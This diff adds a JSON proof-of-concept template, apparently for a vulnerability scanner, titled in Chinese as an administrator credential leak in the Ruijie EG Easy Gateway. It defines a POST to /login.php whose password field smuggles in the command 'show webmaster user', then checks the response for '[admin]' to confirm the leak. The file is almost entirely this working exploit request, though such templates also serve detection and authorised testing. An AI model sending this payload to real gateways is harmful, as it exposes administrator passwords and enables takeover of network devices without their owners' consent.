@@ -1,0 +1,19 @@
+{
+  "poc": "锐捷EG易网关管理员账号密码泄露漏洞",
+  "req":[
+    {
+      "method": "POST",
+      "uri": "/login.php",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "application/x-www-form-urlencoded"
+      },
+      "data": "username=admin&password=admin?show+webmaster+user",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["[admin]"]
+      }
+    }
+  ]
+}
